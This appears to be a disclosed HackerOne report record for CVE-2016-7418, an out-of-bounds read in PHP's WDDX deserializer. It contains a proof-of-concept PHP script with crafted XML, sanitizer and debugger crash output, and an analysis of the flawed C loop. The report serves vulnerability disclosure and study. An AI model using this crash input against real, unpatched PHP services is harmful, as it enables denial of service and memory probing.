{"id":170618,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA2MTg=","url":"https://hackerone.com/reports/170618","title":"CVE-2016-7418 PHP Out-Of-Bounds Read in php_wddx_push_element","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-09-20T02:33:52.954Z","submitted_at":"2016-09-20T02:33:52.954Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hacker2nd","url":"/hacker2nd","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-10T01:50:19.652Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-10-10T01:50:15.000Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# CVE-2016-7418 PHP Out-Of-Bounds Read in php_wddx_push_element\n\n## 1. Affected Version\n+ PHP 7.0.10\n+ PHP 5.6.25\n\n## 2. Credit\nThis vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.\n\n## 3. Testing Environments\n+ **OS**: Ubuntu\n+ **PHP**: [7.0.10](http://php.net/distributions/php-7.0.10.tar.gz)\n+ **Compiler**: Clang\n+ **CFLAGS**: ``-g -O0 -fsanitize=address``\n\n## 4. PoC\nThere are **five** similar issues in function ``php_wddx_push_element``, but I'll just demonstrate one issue here. More proof-of-concept files are available at [PHP BUG 73065](https://bugs.php.net/bug.php?id=73065).\n\n```\n\u003c?php\n    $xml = \u003c\u003c\u003cXML\n\u003c?xml version='1.0' ?\u003e\n    \u003c!DOCTYPE et SYSTEM 'w'\u003e\n    \u003cwddxPacket ven='1.0'\u003e\n        \u003carray\u003e\n            \u003cvar Name=\"name\"\u003e\n                \u003cboolean value=\"keliu\"\u003e\u003c/boolean\u003e\n            \u003c/var\u003e\n            \u003cvar name=\"1111\"\u003e\n                \u003cvar name=\"2222\"\u003e\n                    \u003cvar name=\"3333\"\u003e\u003c/var\u003e\n                \u003c/var\u003e\n            \u003c/var\u003e\n        \u003c/array\u003e\n    \u003c/wddxPacket\u003e\nXML;\n    \n    $array = wddx_deserialize($xml);\n    var_dump($array);\n?\u003e\n```\n\n## 5. Vulnerability Details\n\nAddressSanitizer output the following exception information.\n\n```\n==47769==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 \n    (pc 0x00000046fb9c bp 0x7ffc278e29b0 sp 0x7ffc278e2130 T0)\n    #0 0x46fb9b in __interceptor_strcmp.part.24 (php-src/sapi/cli/php+0x46fb9b)\n    #1 0xac41d4 in php_wddx_push_element php-src/ext/wddx/wddx.c:791:9\n    #2 0x7fa8715ac67f in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x867f)\n    #3 0x7fa8715ad38b in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x938b)\n    #4 0x7fa8715aecad in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xacad)\n    #5 0x7fa8715af404 in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xb404)\n    #6 0x7fa8715b170a in XML_ParseBuffer (/lib/x86_64-linux-gnu/libexpat.so.1+0xd70a)\n    #7 0xac1717 in php_wddx_deserialize_ex php-src/ext/wddx/wddx.c:1081:2\n    #8 0xabad7a in zif_wddx_deserialize php-src/ext/wddx/wddx.c:1299:2\n    #9 0xfdfb3d in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER php-src/Zend/zend_vm_execute.h:675:2\n    #10 0xe75f4b in execute_ex php-src/Zend/zend_vm_execute.h:432:7\n    #11 0xe76ec3 in zend_execute php-src/Zend/zend_vm_execute.h:474:2\n    #12 0xd00e9e in zend_execute_scripts php-src/Zend/zend.c:1464:4\n    #13 0xad4425 in php_execute_script php-src/main/main.c:2537:14\n    #14 0x10fca26 in do_cli php-src/sapi/cli/php_cli.c:990:5\n    #15 0x10f9f60 in main php-src/sapi/cli/php_cli.c:1378:18\n    #16 0x7fa86fec582f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291\n    #17 0x449578 in _start (php-src/sapi/cli/php+0x449578)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV (php-src/sapi/cli/php+0x46fb9b) in __interceptor_strcmp.part.24\n==47769==ABORTING\n```\n\nAddressSanitizer indicates that this is a NULL pointer dereference issue. However, if we debug it under GDB, we'll find out that this can be a Out-Of-Bounds read issue.\n\n```\n(gdb) n\nProgram received signal SIGSEGV, Segmentation fault.\n__strcmp_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S:31\n31\t../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S: No such file or directory.\n\n(gdb) x/i $rip\n=\u003e 0x7ffff6da1b5a \u003c__strcmp_sse2_unaligned+26\u003e:\tmovdqu (%rdi),%xmm1\n\n(gdb) i r $rdi\nrdi            0x74656b6361507801\t8387227955626014721\n\n(gdb) x/20xb $rdi\n0x74656b6361507801:\tCannot access memory at address 0x74656b6361507801\n```\n\nTo some degree, the value of ``rdi`` register can be controlled. For example, value ``0x74656b6361507801`` can be expressed as ``\\x01xPacket``. This can be controlled in the XML code in the proof-of-concept file.\n\n```\n\u003e\u003e\u003e '74656b6361507801'.decode('hex')[::-1]\n'\\x01xPacket'\n```\n\n# 6. Source Code Analysis\nThe code lead to this issue is listed as follows.\n\n```\n790  if (atts) for (i = 0; atts[i]; i++) {\n791      if (!strcmp((char *)atts[i], EL_NAME) \u0026\u0026 atts[++i] \u0026\u0026 atts[i][0]) {\n792          if (stack-\u003evarname) efree(stack-\u003evarname);\n793          stack-\u003evarname = estrdup((char *)atts[i]);\n794          break;\n795      }\n796  }\n```\n\nTesting data to trigger this issue is listed as follows.\n\n```\natts[0] = 0x0000000000cf8699  \"Name\"\natts[1] = 0x0000000000cf783c  \"name\"   EL_NAME\natts[2] = 0x0000000000000000  NULL\natts[3] = 0x74656b6361507801  ????\n```\n\nHere ``atts[2]`` was not checked in the ``for`` loop but in the ``if`` statement (checked when evaluating ``atts[++i]``). So when entering the ``if`` statement next time, ``strcmp(atts[3], EL_NAME)`` would cause an Out-Of-Bounds read issue.\n\n## 7. Timeline\n+ 2016.09.12 - Found\n+ 2016.09.12 - Reported to PHP via [73065](https://bugs.php.net/bug.php?id=73065)\n+ 2016.09.12 - Fixed\n+ 2016.09.15 - Assigned CVE-2016-7418\n+ 2016.09.15 - [PHP 7.0.10](http://www.php.net/ChangeLog-7.php#7.0.11) and [PHP 5.6.25](http://www.php.net/ChangeLog-5.php#5.6.26) Released\n","vulnerability_information_html":"\u003ch1 id=\"cve-2016-7418-php-out-of-bounds-read-in-php_wddx_push_element\"\u003eCVE-2016-7418 PHP Out-Of-Bounds Read in php_wddx_push_element\u003c/h1\u003e\n\n\u003ch2 id=\"1-affected-version\"\u003e1. Affected Version\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003ePHP 7.0.10\u003c/li\u003e\n\u003cli\u003ePHP 5.6.25\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"2-credit\"\u003e2. Credit\u003c/h2\u003e\n\n\u003cp\u003eThis vulnerability was discovered by Ke Liu of Tencent\u0026#39;s Xuanwu LAB.\u003c/p\u003e\n\n\u003ch2 id=\"3-testing-environments\"\u003e3. Testing Environments\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cstrong\u003eOS\u003c/strong\u003e: Ubuntu\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003ePHP\u003c/strong\u003e: \u003ca href=\"/redirect?url=http%3A%2F%2Fphp.net%2Fdistributions%2Fphp-7.0.10.tar.gz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e7.0.10\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eCompiler\u003c/strong\u003e: Clang\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eCFLAGS\u003c/strong\u003e: \u003ccode\u003e-g -O0 -fsanitize=address\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"4-poc\"\u003e4. PoC\u003c/h2\u003e\n\n\u003cp\u003eThere are \u003cstrong\u003efive\u003c/strong\u003e similar issues in function \u003ccode\u003ephp_wddx_push_element\u003c/code\u003e, but I\u0026#39;ll just demonstrate one issue here. More proof-of-concept files are available at \u003ca href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73065\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePHP BUG 73065\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$xml\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sh\"\u003e\u0026lt;\u0026lt;\u0026lt;XML\n\u0026lt;?xml version=\u0026#39;1.0\u0026#39; ?\u0026gt;\n    \u0026lt;!DOCTYPE et SYSTEM \u0026#39;w\u0026#39;\u0026gt;\n    \u0026lt;wddxPacket ven=\u0026#39;1.0\u0026#39;\u0026gt;\n        \u0026lt;array\u0026gt;\n            \u0026lt;var Name=\u0026quot;name\u0026quot;\u0026gt;\n                \u0026lt;boolean value=\u0026quot;keliu\u0026quot;\u0026gt;\u0026lt;/boolean\u0026gt;\n            \u0026lt;/var\u0026gt;\n            \u0026lt;var name=\u0026quot;1111\u0026quot;\u0026gt;\n                \u0026lt;var name=\u0026quot;2222\u0026quot;\u0026gt;\n                    \u0026lt;var name=\u0026quot;3333\u0026quot;\u0026gt;\u0026lt;/var\u0026gt;\n                \u0026lt;/var\u0026gt;\n            \u0026lt;/var\u0026gt;\n        \u0026lt;/array\u0026gt;\n    \u0026lt;/wddxPacket\u0026gt;\nXML;\u003c/span\u003e\n\n    \u003cspan class=\"nv\"\u003e$array\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewddx_deserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$xml\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003evar_dump\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$array\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"5-vulnerability-details\"\u003e5. Vulnerability Details\u003c/h2\u003e\n\n\u003cp\u003eAddressSanitizer output the following exception information.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e==47769==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 \n    (pc 0x00000046fb9c bp 0x7ffc278e29b0 sp 0x7ffc278e2130 T0)\n    #0 0x46fb9b in __interceptor_strcmp.part.24 (php-src/sapi/cli/php+0x46fb9b)\n    #1 0xac41d4 in php_wddx_push_element php-src/ext/wddx/wddx.c:791:9\n    #2 0x7fa8715ac67f in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x867f)\n    #3 0x7fa8715ad38b in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x938b)\n    #4 0x7fa8715aecad in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xacad)\n    #5 0x7fa8715af404 in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xb404)\n    #6 0x7fa8715b170a in XML_ParseBuffer (/lib/x86_64-linux-gnu/libexpat.so.1+0xd70a)\n    #7 0xac1717 in php_wddx_deserialize_ex php-src/ext/wddx/wddx.c:1081:2\n    #8 0xabad7a in zif_wddx_deserialize php-src/ext/wddx/wddx.c:1299:2\n    #9 0xfdfb3d in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER php-src/Zend/zend_vm_execute.h:675:2\n    #10 0xe75f4b in execute_ex php-src/Zend/zend_vm_execute.h:432:7\n    #11 0xe76ec3 in zend_execute php-src/Zend/zend_vm_execute.h:474:2\n    #12 0xd00e9e in zend_execute_scripts php-src/Zend/zend.c:1464:4\n    #13 0xad4425 in php_execute_script php-src/main/main.c:2537:14\n    #14 0x10fca26 in do_cli php-src/sapi/cli/php_cli.c:990:5\n    #15 0x10f9f60 in main php-src/sapi/cli/php_cli.c:1378:18\n    #16 0x7fa86fec582f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291\n    #17 0x449578 in _start (php-src/sapi/cli/php+0x449578)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV (php-src/sapi/cli/php+0x46fb9b) in __interceptor_strcmp.part.24\n==47769==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAddressSanitizer indicates that this is a NULL pointer dereference issue. However, if we debug it under GDB, we\u0026#39;ll find out that this can be a Out-Of-Bounds read issue.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) n\nProgram received signal SIGSEGV, Segmentation fault.\n__strcmp_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S:31\n31  ../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S: No such file or directory.\n\n(gdb) x/i $rip\n=\u0026gt; 0x7ffff6da1b5a \u0026lt;__strcmp_sse2_unaligned+26\u0026gt;: movdqu (%rdi),%xmm1\n\n(gdb) i r $rdi\nrdi            0x74656b6361507801   8387227955626014721\n\n(gdb) x/20xb $rdi\n0x74656b6361507801: Cannot access memory at address 0x74656b6361507801\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo some degree, the value of \u003ccode\u003erdi\u003c/code\u003e register can be controlled. For example, value \u003ccode\u003e0x74656b6361507801\u003c/code\u003e can be expressed as \u003ccode\u003e\\x01xPacket\u003c/code\u003e. This can be controlled in the XML code in the proof-of-concept file.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026gt;\u0026gt;\u0026gt; \u0026#39;74656b6361507801\u0026#39;.decode(\u0026#39;hex\u0026#39;)[::-1]\n\u0026#39;\\x01xPacket\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"6-source-code-analysis\"\u003e6. Source Code Analysis\u003c/h1\u003e\n\n\u003cp\u003eThe code lead to this issue is listed as follows.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e790  if (atts) for (i = 0; atts[i]; i++) {\n791      if (!strcmp((char *)atts[i], EL_NAME) \u0026amp;\u0026amp; atts[++i] \u0026amp;\u0026amp; atts[i][0]) {\n792          if (stack-\u0026gt;varname) efree(stack-\u0026gt;varname);\n793          stack-\u0026gt;varname = estrdup((char *)atts[i]);\n794          break;\n795      }\n796  }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTesting data to trigger this issue is listed as follows.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eatts[0] = 0x0000000000cf8699  \u0026quot;Name\u0026quot;\natts[1] = 0x0000000000cf783c  \u0026quot;name\u0026quot;   EL_NAME\natts[2] = 0x0000000000000000  NULL\natts[3] = 0x74656b6361507801  ????\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere \u003ccode\u003eatts[2]\u003c/code\u003e was not checked in the \u003ccode\u003efor\u003c/code\u003e loop but in the \u003ccode\u003eif\u003c/code\u003e statement (checked when evaluating \u003ccode\u003eatts[++i]\u003c/code\u003e). So when entering the \u003ccode\u003eif\u003c/code\u003e statement next time, \u003ccode\u003estrcmp(atts[3], EL_NAME)\u003c/code\u003e would cause an Out-Of-Bounds read issue.\u003c/p\u003e\n\n\u003ch2 id=\"7-timeline\"\u003e7. Timeline\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e2016.09.12 - Found\u003c/li\u003e\n\u003cli\u003e2016.09.12 - Reported to PHP via \u003ca href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73065\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e73065\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e2016.09.12 - Fixed\u003c/li\u003e\n\u003cli\u003e2016.09.15 - Assigned CVE-2016-7418\u003c/li\u003e\n\u003cli\u003e2016.09.15 - \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.php.net%2FChangeLog-7.php%237.0.11\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePHP 7.0.10\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.php.net%2FChangeLog-5.php%235.6.26\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePHP 5.6.25\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e Released\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-09T01:50:15.137Z","allow_singular_disclosure_after":-4330234.349547447,"singular_disclosure_allowed":true,"vote_count":4,"voters":["mik317","dyabla","merc29","amksa"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1205854,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-20T05:02:21.907Z","updated_at":"2016-09-20T05:02:21.907Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hacker2nd","url":"/hacker2nd"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1205855,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-20T05:02:26.873Z","updated_at":"2016-09-20T05:02:26.873Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"hacker2nd","url":"/hacker2nd"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026107,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:27:20.684Z","updated_at":"2019-10-13T09:27:20.684Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6026656,"is_internal":false,"editable":false,"type":"Activities::CancelledDisclosureRequest","message":"cancel disclosure request","markdown_message":"\u003cp\u003ecancel disclosure request\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-13T09:49:42.912Z","updated_at":"2019-10-13T09:49:42.912Z","actor":{"username":"hacker2nd","cleared":false,"url":"/hacker2nd","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9478713,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-10T01:50:15.037Z","updated_at":"2020-10-10T01:50:15.037Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9478714,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-10T01:50:19.575Z","updated_at":"2020-10-10T01:50:19.575Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}